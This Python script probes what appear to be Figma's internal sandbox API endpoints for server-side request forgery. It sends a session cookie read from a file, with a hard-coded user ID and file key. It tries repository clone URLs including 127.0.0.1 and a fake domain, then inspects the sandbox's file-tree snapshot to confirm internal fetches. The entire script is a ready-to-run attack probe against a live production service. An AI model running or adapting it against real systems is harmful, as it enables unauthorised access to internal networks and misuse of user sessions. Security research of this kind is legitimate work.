"""SSRF 验证:sandbox + workloadConfig.repos[].origin.url → 检查 repos 是否真的被 clone
对三个 URL(真实 github / 127.0.0.1 / 假域名)分别:
  sandbox(带 repos) → sboxdUrl → fs-snapshot(recursive, content=none) → 对比文件树
对照组:foundry_snapshot.txt(无 repos 的模板沙箱)
"""
import io, json, urllib.request, sys, re
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CK = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
UID = "1667396392129259941"
PUB_KEY = "bv2nMIdFf4u3dESGail4sm"

def call_raw(path, body, timeout=90):
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Content-Type": "application/json", "Cookie": CK,
            "X-Figma-Org-ID": "", "X-Figma-Team-ID": "",
            "X-Figma-Client-Lifecycle-ID": "probe",
            "Tsid": "probe", "X-Referer-Service": "web",
            "X-Figma-User-ID": UID, "X-Figma-File-Key": PUB_KEY}
    data = json.dumps(body).encode()
    req = urllib.request.Request("https://www.figma.com" + path, data=data, headers=hdrs, method="POST")
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode(errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')
    except Exception as e:
        return 0, f"!! {type(e).__name__} {str(e)[:80]}"

def extract_paths(sse_text):
    paths = []
    for m in re.finditer(r'data: (\{.*?\})\n', sse_text, re.S):
        try:
            o = json.loads(m.group(1))
        except Exception:
            continue
        if o.get("type") == "fswatch/event" and o.get("path"):
            paths.append(o["path"])
    return paths

URLS = [
    ("github",  "https://github.com/octocat/Hello-World.git"),
    ("local",   "http://127.0.0.1:80/x.git"),
    ("fake",    "https://nonexistent-domain-xyz123.com/repo.git"),
]

for tag, url in URLS:
    print(f"\n========== repos URL: {tag} ==========")
    body = {"workloadConfig": {"workloadName": "make",
            "repos": [{"path": "repo", "origin": {"url": url, "ref": "main"}}]}}
    st, resp = call_raw("/api/cortex/foundry/sandbox", body)
    print(f"sandbox {st}  {resp[:200]}")
    if st != 200:
        continue
    try:
        sboxd = json.loads(resp)["sboxdUrl"]
    except Exception as e:
        print("no sboxdUrl:", e)
        continue
    st2, snap = call_raw("/api/cortex/foundry/fs-snapshot",
                         {"sboxdUrl": sboxd, "path": ".",
                          "options": {"listing": "recursive", "content": "none"}})
    print(f"fs-snapshot {st2}  {len(snap)}B")
    paths = extract_paths(snap)
    out = f"_foundry_ssrf_{tag}.txt"
    with open(out, "w", encoding="utf-8") as f:
        f.write("\n".join(paths))
    print(f"paths: {len(paths)}  saved to {out}")
    # 顶层条目
    tops = sorted(set(p.split("/", 1)[0] for p in paths))
    print("top-level:", tops)
    # 非 node_modules 的非模板特征路径(找 Hello-World / README / repo)
    non_tmpl = [p for p in paths if "node_modules" not in p]
    interesting = [p for p in non_tmpl if re.search(r'hello|readme|repo|\.git|license', p, re.I)]
    print(f"non-node_modules: {len(non_tmpl)}  interesting: {interesting[:30]}")

# 对照组:无 repos 模板沙箱(之前 foundry_snapshot.txt 提取)
print("\n========== 对照组(无 repos 模板) ==========")
try:
    base = open('foundry_snapshot.txt', encoding='utf-8', errors='replace').read()
    base_paths = set(extract_paths(base))
    base_non = [p for p in base_paths if "node_modules" not in p]
    print(f"template paths: {len(base_paths)}  non-node_modules: {len(base_non)}")
    print("template top-level:", sorted(set(p.split('/',1)[0] for p in base_paths)))
except Exception as e:
    print("ctrl fail:", e)
